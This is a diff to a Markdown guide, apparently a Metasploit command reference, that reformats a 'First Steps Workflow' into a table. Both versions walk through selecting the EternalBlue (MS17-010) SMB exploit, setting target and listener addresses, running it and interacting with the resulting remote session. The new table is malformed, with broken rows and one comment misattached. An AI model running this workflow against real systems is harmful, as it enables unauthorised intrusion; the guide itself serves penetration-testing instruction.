@@ -140,20 +140,21 @@ A metasploit dictionary from beginner level the advanced level including most of
 
 ## First Steps Workflow (Example)
 
-
-msfconsole -d           # Start Metasploit with database support
-workspace target1       # Create a new workspace
-search eternalblue      # Search for an exploit
-use exploit/windows/smb/ms17_010_eternalblue
-show options            # See what needs to be set
-set RHOSTS 192.168.1.10
-set LHOST 192.168.1.5   # Your IP
-set LPORT 4444
-check                   # See if it's vulnerable
-run                     # Run the exploit
-sessions                # See the session you got back
-sessions -i 1           # Interact with it
-background              # Send session to the background when done
+|Task|Meaning|
+|-------|----------|
+|msfconsole -d |     #Start
+Metasploit with database support|
+|workspace target1|       # Create a new workspace|
+|search eternalblue |     # Search for an exploit|
+-use |exploit/windows/smb/ms17_010_eternalblue|            # See what needs to be set|
+|set RHOSTS 192.168.1.10
+set LHOST 192.168.1.5|   # Your IP
+set LPORT 4444|
+|check |                  # See if it's vulnerable|
+|run |                    # Run the exploit|
+|sessions |              # See the session you got back|
+|sessions -i 1   |        # Interact with it|
+|background   |           # Send session to the background when done|
 
 
 
